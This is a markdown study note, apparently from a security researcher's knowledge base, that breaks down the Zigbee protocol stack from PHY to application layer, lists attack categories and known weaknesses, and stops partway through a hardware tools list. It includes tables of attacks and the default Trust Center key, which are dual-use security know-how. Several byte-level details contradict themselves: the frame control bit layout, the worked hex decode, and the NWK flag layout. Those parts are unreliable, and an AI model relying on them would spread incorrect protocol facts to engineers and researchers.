---
title: Zigbee Protocol Overview - Complete Stack Breakdown
tags: [Zigbee, protocol-analysis, PHY, MAC, NWK, APS, ZDO, IEEE-802.15.4]
category: Zigbee Security
parent: "[[Zigbee/README]]"
status: complete
---

# Zigbee Protocol Overview - Complete Stack Breakdown

> **Purpose**: Comprehensive technical breakdown of all Zigbee protocol layers from Physical (PHY) to Application (APL), including packet structures, mesh networking, and attack surfaces.


# **ZIGBEE - COMPLETE PROTOCOL BREAKDOWN**

## **1. Zigbee Architecture Overview**

Zigbee is built on top of IEEE 802.15.4 and adds mesh networking capabilities:

```
┌─────────────────────────────────────────┐
│      APPLICATION LAYER (APL)            │
│  ┌────────────────┬──────────────────┐  │
│  │ Application    │   ZDO (Zigbee    │  │ ← User endpoints
│  │ Framework      │   Device Object) │  │
│  └────────────────┴──────────────────┘  │
├─────────────────────────────────────────┤
│  APS (Application Support Sublayer)     │ ← Fragmentation, Binding
├─────────────────────────────────────────┤
│  NWK (Network Layer)                    │ ← Routing, Mesh topology
├─────────────────────────────────────────┤
│     ╔═══════════════════════════════╗   │
│     ║   IEEE 802.15.4 (Standard)    ║   │
│     ╠═══════════════════════════════╣   │
│     ║  MAC (Medium Access Control)  ║   │ ← CSMA/CA, ACKs
│     ╠═══════════════════════════════╣   │
│     ║  PHY (Physical Layer)         ║   │ ← Radio, Modulation
│     ╚═══════════════════════════════╝   │
└─────────────────────────────────────────┘
```

**Key Architecture Principles:**
- **Bottom 2 layers (PHY/MAC)**: IEEE 802.15.4 standard (shared with Thread, 6LoWPAN)
- **Top 3 layers (NWK/APS/APL)**: Zigbee Alliance specification
- **Network Topology**: Mesh (unlike BLE's star topology)
- **Device Roles**: Coordinator, Router, End Device

---

## **2. DEVICE TYPES & ROLES**

Unlike WiFi (AP/Client) or BLE (Central/Peripheral), Zigbee has THREE device types:

```
┌──────────────────────────────────────────────────────┐
│            ZIGBEE COORDINATOR (ZC)                   │
│  • ONE per network (network founder)                 │
│  • Full-Function Device (FFD)                        │
│  • Routes packets + manages network                  │
│  • Stores network configuration                      │
│  • Can NEVER sleep (always powered)                  │
└──────────────────────────────────────────────────────┘
                        │
        ┌───────────────┴────────────────┐
        ▼                                ▼
┌──────────────────────┐      ┌──────────────────────┐
│  ZIGBEE ROUTER (ZR)  │      │  END DEVICE (ZED)    │
│  • Multiple allowed  │      │  • Leaf nodes only   │
│  • FFD               │      │  • Reduced-Function  │
│  • Routes packets    │      │  • NO routing        │
│  • Extends network   │      │  • CAN sleep (low    │
│  • Always powered    │      │    power!)           │
└──────────────────────┘      └──────────────────────┘
```

**Network Topology Example:**
```
        [ZC] ←─── Coordinator (1 per network)
         │
    ┌────┼────┬────────┐
    ▼    ▼    ▼        ▼
   [ZR] [ZR] [ZR]     [ZED] ←─ End Device (talks only to parent)
    │    │    │
    ▼    ▼    ▼
  [ZED][ZED][ZED]

Mesh paths possible between ZC ↔ ZR ↔ ZR
End devices ALWAYS single-hop to their parent
```

---

## **3. PHYSICAL LAYER (IEEE 802.15.4)**

### **3.1 Frequency Bands & Channels**

Zigbee operates on THREE frequency bands (unlike BLE's single 2.4 GHz band):

```
FREQUENCY BANDS:
┌────────────────────────────────────────────────────────┐
│  868 MHz (Europe)                                      │
│  ├── 1 channel (Channel 0)                             │
│  ├── Data Rate: 20 kbps (original) / 250 kbps (newer) │
│  └── Frequency: 868.3 MHz                              │
├────────────────────────────────────────────────────────┤
│  915 MHz (Americas)                                    │
│  ├── 10 channels (Channels 1-10)                       │
│  ├── Data Rate: 40 kbps (original) / 250 kbps (newer) │
│  └── Frequencies: 906-924 MHz (2 MHz spacing)          │
├────────────────────────────────────────────────────────┤
│  2.4 GHz (Worldwide) ← MOST COMMON                     │
│  ├── 16 channels (Channels 11-26)                      │
│  ├── Data Rate: 250 kbps                               │
│  └── Frequencies: 2.405 - 2.480 GHz (5 MHz spacing)    │
│      Channel 11: 2405 MHz                              │
│      Channel 12: 2410 MHz                              │
│      ...                                               │
│      Channel 26: 2480 MHz                              │
└────────────────────────────────────────────────────────┘
```

**2.4 GHz Channel Distribution:**
```
WiFi Channel 1 (2412 MHz) ──┐
Zigbee Ch 11 (2405)         │  Overlap!
Zigbee Ch 12 (2410)         ├─ Coexistence issues
Zigbee Ch 13 (2415)         │  with WiFi
WiFi Channel 6 (2437 MHz) ──┤
Zigbee Ch 20 (2450)         │
WiFi Channel 11 (2462 MHz)──┘
```

**Best Zigbee Channels to avoid WiFi:**
- Zigbee Channel 15 (2425 MHz) - Between WiFi CH 1 & 6
- Zigbee Channel 20 (2450 MHz) - Between WiFi CH 6 & 11
- Zigbee Channel 25 (2475 MHz) - Above WiFi CH 11

### **3.2 Modulation**
- **2.4 GHz Band**: O-QPSK (Offset Quadrature Phase Shift Keying)
- **868/915 MHz**: BPSK (Binary Phase Shift Keying) or O-QPSK
- **Chip Rate**: 2 Mchip/s (2.4 GHz)
- **Symbol Rate**: 62.5 ksymbol/s
- **Data Rate**: 250 kbps (2.4 GHz)

### **3.3 Power Levels**
```
Typical TX Power: 0 dBm (1 mW) to +20 dBm (100 mW)
Range: 10-100 meters indoor (depending on power & obstacles)
```

---

## **4. MAC LAYER (IEEE 802.15.4)**

### **4.1 Addressing**

Zigbee devices have TWO types of addresses:

```
┌──────────────────────────────────────────────┐
│  64-bit Extended Address (IEEE Address)      │
│  • Globally unique (like MAC address)        │
│  • Example: 00:12:4B:00:14:5F:2D:01          │
│  • Burned into hardware                      │
│  • Used during association                   │
└──────────────────────────────────────────────┘

┌──────────────────────────────────────────────┐
│  16-bit Short Address (Network Address)      │
│  • Assigned by Coordinator during join       │
│  • Example: 0x3C4F                           │
│  • Used for routing (smaller = efficient)    │
│  • Unique within PAN only                    │
└──────────────────────────────────────────────┘

Special Addresses:
- 0x0000: Coordinator address (always!)
- 0xFFFF: Broadcast address
- 0xFFFE: Address unknown/not allocated
```

### **4.2 PAN ID (Personal Area Network ID)**

```
PAN ID: 16-bit identifier for the network
Example: 0x1A2B

Purpose:
- Distinguishes your Zigbee network from neighbors
- All devices in same network share same PAN ID
- Similar to WiFi SSID (but numeric)

Special PAN IDs:
- 0xFFFF: Broadcast PAN (used during discovery)
```

### **4.3 Frame Types**

IEEE 802.15.4 defines FOUR frame types:

```
┌────────────┬──────────┬─────────────────────────────────┐
│ Frame Type │   Hex    │          Purpose                │
├────────────┼──────────┼─────────────────────────────────┤
│  Beacon    │   0x00   │ Network discovery & sync        │
│  Data      │   0x01   │ Application data transfer       │
│  ACK       │   0x02   │ Acknowledgment frame            │
│  Command   │   0x03   │ MAC-level commands (assoc, etc) │
└────────────┴──────────┴─────────────────────────────────┘
```

---

## **5. PACKET STRUCTURE (MAC FRAME)**

Every Zigbee packet at MAC layer has this structure:

```
┌──────────┬────────┬──────────┬─────────┬─────────┐
│ PREAMBLE │  SFD   │  LENGTH  │   PHR   │   PSDU  │
│ (4 bytes)│ (1 B)  │  (1 B)   │ (varies)│(0-127 B)│
└──────────┴────────┴──────────┴─────────┴─────────┘
    PHY          PHY      PHY        MAC        MAC
   Header       Header   Header    Header    Payload
```

Let's break down the **PSDU** (PHY Service Data Unit):

```
PSDU STRUCTURE:
┌─────────────────────────────────────────────────────┐
│                   MAC HEADER (MHR)                  │
│  • Frame Control (2 bytes)                          │
│  • Sequence Number (1 byte)                         │
│  • Addressing Fields (4-20 bytes)                   │
├─────────────────────────────────────────────────────┤
│                   MAC PAYLOAD                       │
│  • Data or Command (0-102 bytes)                    │
├─────────────────────────────────────────────────────┤
│                   MAC FOOTER (MFR)                  │
│  • Frame Check Sequence / FCS (2 bytes)             │
└─────────────────────────────────────────────────────┘
```

### **5.1 Frame Control Field (2 bytes / 16 bits)**

```
Bit Layout:
┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
│ 15 │ 14 │ 13 │ 12 │ 11 │ 10 │  9 │  8 │  7 │  6 │  5 │  4 │  3 │  2 │  1 │  0 │
├────┴────┼────┼────┼────┼────┴────┴────┼────┼────┼────┼────┴────┼────┴────┴────┤
│Reserved │PAN │ ACK│ FP │  Reserved   │ IEL│ DAM│ Ver│  SAM    │  Frame Type │
│   (3b)  │ID  │Req │Pend│    (3b)     │    │(2b)│(2b)│  (2b)   │    (3b)     │
│         │Cmp │    │    │             │    │    │    │         │             │
└─────────┴────┴────┴────┴─────────────┴────┴────┴────┴─────────┴─────────────┘
```

**Field Breakdown:**

| Field | Bits | Values | Meaning |
|-------|------|--------|---------|
| **Frame Type** | 0-2 | 000=Beacon, 001=Data, 010=ACK, 011=Command | Packet type |
| **Security Enabled** | 3 | 0=No, 1=Yes | Encryption status |
| **Frame Pending** | 4 | 0=No more, 1=More data buffered | For sleeping devices |
| **ACK Request** | 5 | 0=No ACK, 1=ACK required | Reliability |
| **PAN ID Compression** | 6 | 0=Both PAN IDs, 1=One PAN ID | Space optimization |
| **Reserved** | 7-9 | 0 | Must be zero |
| **Dest Addressing Mode** | 10-11 | 00=None, 10=Short, 11=Extended | Destination addr type |
| **Frame Version** | 12-13 | 00=2003, 01=2006, 10=2015 | 802.15.4 version |
| **Src Addressing Mode** | 14-15 | 00=None, 10=Short, 11=Extended | Source addr type |

### **5.2 Addressing Fields**

Depending on addressing modes, the address section can vary:

```
EXAMPLE: Short Addressing (most common)
┌────────────────────────────────────────┐
│  Destination PAN ID (2 bytes)          │
├────────────────────────────────────────┤
│  Destination Address (2 bytes)         │
├────────────────────────────────────────┤
│  Source PAN ID (2 bytes, optional)     │ ← Omitted if PAN ID Compression=1
├────────────────────────────────────────┤
│  Source Address (2 bytes)              │
└────────────────────────────────────────┘

EXAMPLE: Extended Addressing
┌────────────────────────────────────────┐
│  Destination PAN ID (2 bytes)          │
├────────────────────────────────────────┤
│  Destination Address (8 bytes)         │
├────────────────────────────────────────┤
│  Source PAN ID (2 bytes, optional)     │
├────────────────────────────────────────┤
│  Source Address (8 bytes)              │
└────────────────────────────────────────┘
```

### **5.3 Complete Data Frame Example**

```
EXAMPLE: Zigbee Data Packet (Hex)

┌─ PHY Header (Preamble + SFD) ─────────────────────┐
│ 00 00 00 00 A7                                     │
│ └─ Preamble └─ SFD (Start Frame Delimiter)        │
└────────────────────────────────────────────────────┘

┌─ PHY Length ───────────────────────────────────────┐
│ 1F  (31 bytes of PSDU)                             │
└────────────────────────────────────────────────────┘

┌─ MAC Header ───────────────────────────────────────┐
│ 61 88  ← Frame Control                             │
│   │ │                                              │
│   │ └─ Sequence Number: 0x88                       │
│   └─ Frame Control: 0x6188                         │
│       Binary: 0110 0001 1000 1000                  │
│       • Frame Type: 001 (Data)                     │
│       • Security: 1 (Enabled!)                     │
│       • ACK Req: 1 (Yes)                           │
│       • PAN Compression: 1 (Same PAN)              │
│       • Dest Addr Mode: 10 (Short/16-bit)          │
│       • Src Addr Mode: 10 (Short/16-bit)           │
│                                                     │
│ 1A 2B  ← Destination PAN ID (0x2B1A)               │
│ 00 00  ← Destination Address (0x0000 = Coordinator)│
│ 4F 3C  ← Source Address (0x3C4F)                   │
└────────────────────────────────────────────────────┘

┌─ MAC Payload (Encrypted) ──────────────────────────┐
│ [Encrypted Network Layer + APS + Application Data] │
│ 23 bytes of encrypted content...                   │
└────────────────────────────────────────────────────┘

┌─ FCS (Frame Check Sequence) ───────────────────────┐
│ A5 3F  ← CRC-16 (2 bytes)                          │
└────────────────────────────────────────────────────┘
```

---

## **6. MAC LAYER COMMANDS**

These are MAC-level control frames (Frame Type = 0x03):

```
┌────────────────┬──────┬──────────────────────────────┐
│ Command        │ Hex  │ Purpose                      │
├────────────────┼──────┼──────────────────────────────┤
│ Assoc Request  │ 0x01 │ Device wants to join network │
│ Assoc Response │ 0x02 │ Coordinator grants join      │
│ Disassoc Notify│ 0x03 │ Device leaving network       │
│ Data Request   │ 0x04 │ Poll for buffered data       │
│ PAN ID Conflict│ 0x05 │ Detected duplicate PAN ID    │
│ Orphan Notify  │ 0x06 │ Lost parent, seeking new one │
│ Beacon Request │ 0x07 │ Request beacon frames        │
│ Coordinator    │ 0x08 │ Request to realign network   │
│   Realignment  │      │                              │
│ GTS Request    │ 0x09 │ Guaranteed Time Slot request │
└────────────────┴──────┴──────────────────────────────┘
```

---

## **7. NETWORK LAYER (NWK)**

This is where Zigbee gets interesting! The Network Layer handles routing and mesh networking.

### **7.1 Network Layer Frame Structure**

```
┌──────────────────────────────────────────────────┐
│              NWK HEADER (8-16 bytes)             │
│  • Frame Control (2 bytes)                       │
│  • Destination Address (2 bytes)                 │
│  • Source Address (2 bytes)                      │
│  • Radius (1 byte)                               │
│  • Sequence Number (1 byte)                      │
│  • [Optional: Multicast, Source Route, Ext]     │
├──────────────────────────────────────────────────┤
│              NWK PAYLOAD                         │
│  • APS Layer or NWK Command                      │
├──────────────────────────────────────────────────┤
│              NWK FOOTER                          │
│  • MIC (Message Integrity Code, if secured)      │
└──────────────────────────────────────────────────┘
```

### **7.2 NWK Frame Control (2 bytes)**

```
Byte 0:
┌────┬────┬────┬────┬────┬────┬────┬────┐
│  7 │  6 │  5 │  4 │  3 │  2 │  1 │  0 │
├────┴────┼────┼────┴────┼────┴────┴────┤
│Frame Type│Vers│  Disc  │   Reserved   │
│   (2b)   │(4b)│ Route  │     (2b)     │
│          │    │  (2b)  │              │
└──────────┴────┴────────┴──────────────┘

Frame Types:
00 = Data
01 = Command
10 = Reserved
11 = Inter-PAN

Byte 1:
┌────┬────┬────┬────┬────┬────┬────┬────┐
│ 15 │ 14 │ 13 │ 12 │ 11 │ 10 │  9 │  8 │
├────┼────┼────┼────┼────┼────┼────┼────┤
│Mcast│Secure│Src  │Dst │Ext │Rsvd│Rsvd│Rsvd│
│Flag │    │Route│IEEE│Hdr │    │    │    │
└────┴────┴────┴────┴────┴────┴────┴────┘

Multicast: 1 = Multicast frame
Security: 1 = NWK layer encryption
Source Route: 1 = Source routing included
Dest IEEE: 1 = Destination IEEE addr included
Extended Header: 1 = Extended header present
```

### **7.3 Routing**

Zigbee uses **AODV** (Ad-hoc On-Demand Distance Vector) routing:

```
ROUTE DISCOVERY PROCESS:

Step 1: Source sends RREQ (Route Request)
┌──────┐
│ ZC   │ ──RREQ──→ ┌──────┐
└──────┘           │ ZR-1 │ ──RREQ──→ ┌──────┐
                   └──────┘           │ ZR-2 │
                                      └──────┘
                                         │
                                      RREQ
                                         ↓
                                      ┌──────┐
                                      │ Dest │
                                      └──────┘

Step 2: Destination sends RREP (Route Reply)
                                      ┌──────┐
                                      │ Dest │
                                      └──────┘
                                         │
                                      RREP
                                         ↓
                   ┌──────┐           ┌──────┐
                   │ ZR-1 │ ←─RREP─── │ ZR-2 │
                   └──────┘           └──────┘
                      │
                   RREP
                      ↓
┌──────┐           ┌──────┐
│ ZC   │ ←─RREP─── │ ZR-1 │
└──────┘           └──────┘

Step 3: Data flows along established route
┌──────┐           ┌──────┐           ┌──────┐           ┌──────┐
│ ZC   │ ──Data──→ │ ZR-1 │ ──Data──→ │ ZR-2 │ ──Data──→ │ Dest │
└──────┘           └──────┘           └──────┘           └──────┘
```

**Routing Table Entry:**
```
┌─────────────────────────────────────────────┐
│ Destination Address: 0x4F3C                 │
│ Next Hop: 0x1A2B                            │
│ Status: Active                              │
│ Route Cost: 3                               │
│ Age: 120 seconds                            │
└─────────────────────────────────────────────┘
```

### **7.4 NWK Commands**

```
┌───────────────────────┬──────┬──────────────────────────┐
│ Command               │ Hex  │ Purpose                  │
├───────────────────────┼──────┼──────────────────────────┤
│ Route Request (RREQ)  │ 0x01 │ Find route to dest       │
│ Route Reply (RREP)    │ 0x02 │ Response with route      │
│ Network Status        │ 0x03 │ Report network condition │
│ Leave                 │ 0x04 │ Device leaving network   │
│ Route Record          │ 0x05 │ Record route path        │
│ Rejoin Request        │ 0x06 │ Rejoin network           │
│ Rejoin Response       │ 0x07 │ Rejoin granted           │
│ Link Status           │ 0x08 │ Neighbor link quality    │
│ Network Report        │ 0x09 │ Network updates          │
│ Network Update        │ 0x0A │ PAN ID/Channel update    │
│ End Device Timeout    │ 0x0B │ Child timeout request    │
└───────────────────────┴──────┴──────────────────────────┘
```

---

## **8. APPLICATION SUPPORT SUBLAYER (APS)**

### **8.1 APS Frame Structure**

```
┌──────────────────────────────────────────────────┐
│              APS HEADER (8-12 bytes)             │
│  • Frame Control (1 byte)                        │
│  • Destination Endpoint (1 byte)                 │
│  • Cluster ID (2 bytes)                          │
│  • Profile ID (2 bytes)                          │
│  • Source Endpoint (1 byte)                      │
│  • APS Counter (1 byte)                          │
│  • [Optional: Extended Header]                   │
├──────────────────────────────────────────────────┤
│              APS PAYLOAD                         │
│  • ZCL (Zigbee Cluster Library) Commands        │
│  • Or raw application data                       │
├──────────────────────────────────────────────────┤
│              APS FOOTER                          │
│  • MIC (Message Integrity Code, if secured)      │
└──────────────────────────────────────────────────┘
```

### **8.2 Endpoints**

Think of endpoints like TCP/UDP port numbers:

```
Device with Multiple Endpoints:
┌──────────────────────────────────────┐
│         Zigbee Device                │
│  ┌────────────────────────────────┐  │
│  │ EP 1: Light (On/Off Cluster)   │  │
│  ├────────────────────────────────┤  │
│  │ EP 2: Light (Level Control)    │  │
│  ├────────────────────────────────┤  │
│  │ EP 3: Temperature Sensor       │  │
│  ├────────────────────────────────┤  │
│  │ EP 240: Green Power            │  │
│  ├────────────────────────────────┤  │
│  │ EP 242: Diagnostics            │  │
│  └────────────────────────────────┘  │
└──────────────────────────────────────┘

Special Endpoints:
- 0: ZDO (Zigbee Device Object)
- 1-240: Application endpoints
- 241: GPS
- 242: Diagnostics
- 255: Broadcast
```

### **8.3 Clusters**

Clusters define functionality (similar to BLE services):

```
Common Zigbee Clusters:

┌────────────────┬─────────┬─────────────────────────┐
│ Cluster Name   │ Cluster │ Purpose                 │
│                │   ID    │                         │
├────────────────┼─────────┼─────────────────────────┤
│ On/Off         │ 0x0006  │ Simple switch control   │
│ Level Control  │ 0x0008  │ Dimming                 │
│ Color Control  │ 0x0300  │ RGB/Hue control         │
│ Temperature    │ 0x0402  │ Temp measurement        │
│ Humidity       │ 0x0405  │ Humidity measurement    │
│ Occupancy      │ 0x0406  │ Motion detection        │
│ Door Lock      │ 0x0101  │ Lock/unlock control     │
│ Thermostat     │ 0x0201  │ HVAC control            │
│ IAS Zone       │ 0x0500  │ Security sensors        │
│ Electrical     │ 0x0B04  │ Power measurement       │
│   Measurement  │         │                         │
└────────────────┴─────────┴─────────────────────────┘
```

### **8.4 Profiles**

Profiles group clusters for specific applications:

```
┌──────────────────────┬─────────┬─────────────────────┐
│ Profile Name         │Profile  │ Purpose             │
│                      │  ID     │                     │
├──────────────────────┼─────────┼─────────────────────┤
│ Zigbee Home          │ 0x0104  │ Home automation     │
│   Automation (ZHA)   │         │                     │
│ Zigbee Light Link    │ 0xC05E  │ Lighting control    │
│   (ZLL)              │         │                     │
│ Zigbee Smart Energy  │ 0x0109  │ Energy management   │
│ Zigbee 3.0           │ 0x0104  │ Unified standard    │
│ Green Power          │ 0xA1E0  │ Battery-free devices│
└──────────────────────┴─────────┴─────────────────────┘
```

---

## **9. ZIGBEE DEVICE OBJECT (ZDO)**

ZDO is the "management" layer - endpoint 0:

```
┌─────────────────────────────────────────────────┐
│              ZDO FUNCTIONS                      │
├─────────────────────────────────────────────────┤
│ • Device discovery                              │
│ • Service discovery (what endpoints exist?)     │
│ • Binding management                            │
│ • Network management                            │
│ • Security management                           │
└─────────────────────────────────────────────────┘
```

### **9.1 Common ZDO Commands**

```
┌────────────────────────────┬────────┬────────────────────┐
│ ZDO Cluster                │Cluster │ Purpose            │
│                            │  ID    │                    │
├────────────────────────────┼────────┼────────────────────┤
│ NWK_addr_req               │ 0x0000 │ Get short addr     │
│ IEEE_addr_req              │ 0x0001 │ Get IEEE addr      │
│ Node_Desc_req              │ 0x0002 │ Get device info    │
│ Simple_Desc_req            │ 0x0004 │ Get endpoint info  │
│ Active_EP_req              │ 0x0005 │ List endpoints     │
│ Match_Desc_req             │ 0x0006 │ Find matching devs │
│ Device_annce               │ 0x0013 │ Announce join      │
│ Mgmt_Leave_req             │ 0x0034 │ Force device leave │
│ Mgmt_Permit_Joining_req    │ 0x0036 │ Allow joining      │
│ Mgmt_NWK_Update_req        │ 0x0038 │ Network scan       │
└────────────────────────────┴────────┴────────────────────┘
```

---

## **10. SECURITY ARCHITECTURE**

Zigbee has TWO security levels:

### **10.1 Security Keys**

```
┌──────────────────────────────────────────────────┐
│              NETWORK KEY (NWK Key)               │
│  • Shared by ALL devices in network              │
│  • 128-bit AES key                               │
│  • Encrypts network-layer frames                 │
│  • Broadcast to all devices                      │
│  • Example: AC 5F 2E D9 8A 3B C4 7F...           │
└──────────────────────────────────────────────────┘
        │
        └─→ Used for: Route Discovery, Broadcasts

┌──────────────────────────────────────────────────┐
│              LINK KEY                            │
│  • Shared between TWO specific devices           │
│  • 128-bit AES key                               │
│  • Encrypts APS-layer frames (point-to-point)    │
│  • More secure than Network Key                  │
│  • Example: 12 8A 4C 6D 9E...                    │
└──────────────────────────────────────────────────┘
        │
        └─→ Used for: Pairing, direct communication

┌──────────────────────────────────────────────────┐
│          TRUST CENTER LINK KEY (TCLK)            │
│  • Link key between device and Coordinator       │
│  • Used during joining/authentication            │
│  • Well-known default: "ZigBeeAlliance09"        │
│    (in older devices - SECURITY RISK!)           │
└──────────────────────────────────────────────────┘
```

### **10.2 Security Modes**

```
ZIGBEE SECURITY MODES:

┌────────────────────────────────────────────────────┐
│  Standard Security (Pre-Zigbee 3.0)               │
│  • Network Key shared via Trust Center             │
│  • Default TCLK often used (WEAK!)                 │
│  • Vulnerable to sniffing during join              │
└────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────┐
│  High Security (Zigbee 3.0)                        │
│  • Install Code derived keys                       │
│  • Unique pre-shared secret per device             │
│  • No default keys                                 │
│  • OOB (Out-of-Band) key exchange                  │
└────────────────────────────────────────────────────┘
```

### **10.3 Encryption Algorithm**

```
Algorithm: AES-CCM* (Counter with CBC-MAC)
Key Size: 128 bits
Nonce: 13 bytes (Source Address + Frame Counter + Security Control)
MIC Size: 4, 8, 16, or 32 bytes (configurable)
```

### **10.4 Security Frame Format**

```
When security is enabled (Security bit = 1):

┌────────────────────────────────────────────┐
│        SECURITY CONTROL (1 byte)           │
│  Bits 0-2: Security Level                  │
│  Bits 3-4: Key Identifier                  │
│  Bit 5: Extended Nonce                     │
├────────────────────────────────────────────┤
│        FRAME COUNTER (4 bytes)             │
│  Monotonically increasing counter          │
├────────────────────────────────────────────┤
│        SOURCE ADDRESS (8 bytes, opt)       │
│  Source IEEE address                       │
├────────────────────────────────────────────┤
│        KEY SEQUENCE NUMBER (1 byte, opt)   │
├────────────────────────────────────────────┤
│        ENCRYPTED PAYLOAD                   │
│        + MIC (Message Integrity Code)      │
└────────────────────────────────────────────┘
```

---

## **11. JOINING PROCESS (COMPLETE FLOW)**

This is Zigbee's equivalent of WiFi association + 4-way handshake!

```
PHASE 1: DISCOVERY
──────────────────────────────────────────────────────
New Device                              Coordinator/Router
    │                                           │
    │─── MAC: Beacon Request (Broadcast) ──────→│
    │    [Scanning for networks]                │
    │                                           │
    │←── MAC: Beacon Response ──────────────────│
    │    [PAN ID, Channel, Allow Join, etc]     │
    │                                           │

PHASE 2: ASSOCIATION
──────────────────────────────────────────────────────
    │                                           │
    │─── MAC: Association Request ─────────────→│
    │    [Extended Address, Capability Info]    │
    │                                           │
    │←── MAC: Association Response ─────────────│
    │    [Short Address assigned: 0x3C4F]       │
    │                                           │

PHASE 3: AUTHENTICATION (via Trust Center)
──────────────────────────────────────────────────────
    │                                           │
    │─── Transport Key Request ────────────────→│
    │    [Requesting Network Key]               │
    │                                           │
    │←── APS: Transport Key ────────────────────│
    │    [Network Key encrypted with TCLK]      │
    │    NWK Key: AC 5F 2E D9 8A 3B C4 7F...    │
    │                                           │

PHASE 4: DEVICE ANNOUNCEMENT
──────────────────────────────────────────────────────
    │                                           │
    │─── ZDO: Device Announce (Broadcast) ─────→│
    │    [I'm here! Short: 0x3C4F]              │
    │    [IEEE: 00:12:4B:00:14:5F:2D:01]        │
    │                                           │

PHASE 5: SERVICE DISCOVERY (Optional)
──────────────────────────────────────────────────────
    │                                           │
    │─── ZDO: Active_EP_req ───────────────────→│
    │    [What endpoints do you have?]          │
    │                                           │
    │←── ZDO: Active_EP_rsp ────────────────────│
    │    [Endpoints: 1, 2, 3]                   │
    │                                           │
    │─── ZDO: Simple_Desc_req (EP 1) ──────────→│
    │    [What's on endpoint 1?]                │
    │                                           │
    │←── ZDO: Simple_Desc_rsp ──────────────────│
    │    [Profile: ZHA, Cluster: On/Off]        │
    │                                           │

PHASE 6: DATA EXCHANGE
──────────────────────────────────────────────────────
    │                                           │
    │─── APS: ZCL Read Attribute ──────────────→│
    │    [Cluster: On/Off, Attr: OnOff]         │
    │                                           │
    │←── APS: ZCL Read Response ────────────────│
    │    [Value: ON (0x01)]                     │
    │                                           │
```

---

## **12. COMPARISON: ZIGBEE vs WiFi vs BLE**

| Aspect | WiFi | BLE | Zigbee |
|--------|------|-----|--------|
| **Standard** | IEEE 802.11 | Bluetooth SIG | IEEE 802.15.4 + Zigbee Alliance |
| **Frequency** | 2.4/5 GHz | 2.4 GHz | 868/915 MHz, 2.4 GHz |
| **Channels** | 14 (2.4 GHz) | 40 (3 adv + 37 data) | 16 (2.4 GHz), 1 (868), 10 (915) |
| **Data Rate** | 54 Mbps+ | 1-2 Mbps | 250 kbps |
| **Range** | 50-100m | 10-100m | 10-100m (mesh extends) |
| **Topology** | Star (AP-Client) | Star (Central-Peripheral) | Mesh (Coordinator-Router-End) |
| **Devices** | AP, Client | Central, Peripheral | Coordinator, Router, End Device |
| **Discovery** | Beacon frames | ADV_IND | Beacon frames |
| **Association** | Auth + Assoc | CONNECT_REQ | Assoc Request/Response |
| **Addressing** | MAC (6 bytes) | BD_ADDR (6 bytes) | IEEE (8 B) + Short (2 B) |
| **Routing** | Not needed (star) | Not needed (star) | AODV mesh routing |
| **Security** | WPA2/WPA3 (AES) | AES-CCM | AES-CCM* |
| **Key Exchange** | 4-way handshake | Pairing | Transport Key (TCLK) |
| **Power** | High | Ultra-low | Low |
| **Use Case** | Internet, Video | Wearables, Audio | Home automation, Sensors |

---

## **13. ATTACK SURFACES FOR YOUR ML RESEARCH**

Based on the protocol breakdown, here are Zigbee attack categories:

### **13.1 Discovery Phase Attacks**
| Attack | Target Layer | Mechanism |
|--------|-------------|-----------|
| **Beacon Flooding** | MAC | Spam beacon frames to overwhelm scanners |
| **Fake Coordinator** | MAC | Broadcast malicious beacon (Rogue AP) |
| **PAN ID Conflict** | MAC | Induce PAN ID changes |
| **Channel Hopping** | PHY | Scan all 16 channels, jam discovery |

### **13.2 Association Phase Attacks**
| Attack | Target Layer | Mechanism |
|--------|-------------|-----------|
| **Association Flood** | MAC | Spam association requests |
| **Replay Attack** | MAC | Replay captured association frames |
| **Orphan Induction** | MAC | Force device to re-associate |
| **Denial of Service** | MAC | Reject all association attempts |

### **13.3 Network Layer Attacks**
| Attack | Target Layer | Mechanism |
|--------|-------------|-----------|
| **Routing Attack** | NWK | Inject fake RREQ/RREP packets |
| **Sinkhole** | NWK | Attract all traffic to malicious node |
| **Wormhole** | NWK | Create tunnel between two attackers |
| **Selective Forwarding** | NWK | Drop certain packets (malicious router) |
| **Replay Counter** | NWK | Replay old packets (if not protected) |

### **13.4 Key Extraction Attacks**
| Attack | Target Layer | Mechanism |
|--------|-------------|-----------|
| **Join Sniffing** | APS | Capture Transport Key during join |
| **Default Key** | APS | Try "ZigBeeAlliance09" (older devices) |
| **Install Code BF** | APS | Brute-force install code (weak devices) |
| **Firmware Extraction** | Physical | Extract keys from device flash memory |

### **13.5 Application Layer Attacks**
| Attack | Target Layer | Mechanism |
|--------|-------------|-----------|
| **Command Injection** | APS/ZCL | Send unauthorized ZCL commands |
| **Binding Manipulation** | APS | Redirect data to attacker |
| **Fuzzing** | APS/ZCL | Send malformed cluster commands |
| **Man-in-the-Middle** | APS | Intercept/modify APS frames |

### **13.6 Physical Layer Attacks**
| Attack | Target Layer | Mechanism |
|--------|-------------|-----------|
| **Jamming** | PHY | Transmit noise on Zigbee channels |
| **Selective Jamming** | PHY | Jam only ACK frames (no retries) |
| **Replay Jamming** | PHY | Transmit recorded interference |

---

## **14. KNOWN VULNERABILITIES**

### **14.1 Weak Default Trust Center Link Key**
```
Problem: Many Zigbee devices use default TCLK
Default: "ZigBeeAlliance09"
Hex: 5A 69 67 42 65 65 41 6C 6C 69 61 6E 63 65 30 39

Impact: Attacker can decrypt Network Key during join
Solution: Zigbee 3.0 requires unique Install Codes
```

### **14.2 Insecure Rejoin**
```
Problem: Device can rejoin without full authentication
Attack: Force device to leave, then sniff rejoin process
Impact: Network Key exposure
```

### **14.3 Unencrypted Network Commands**
```
Problem: Some NWK commands sent without encryption
Example: Leave command, Network Status
Impact: Denial of Service, network disruption
```

### **14.4 Frame Counter Overflow**
```
Problem: 32-bit frame counter can wrap around
Attack: Cause counter overflow to reset to 0
Impact: Replay attacks possible after reset
```

---

## **15. TOOLS FOR ZIGBEE RESEARCH**

### **15.1 Hardware**

```
┌──────────────────────────────────────────────────┐
│  CC2531 USB Dongle (Texas Instruments)           │
│  • Most popular for sniffing                     │
│  • ~$10-20                                       │
│  • Requires firmware flash                       │
│  • 2.4 GHz only                                  │
└──────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────┐
│  ApiMote v4 (Zigbee Security Tool)               │
│  • Purpose-built for security research           │
│  • Packet injection support                      │
│  • ~$200                                         │
└──────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────┐
│  Atmel RZRaven (AVR-based)                       │
│  • USB stick + LCD remote                        │
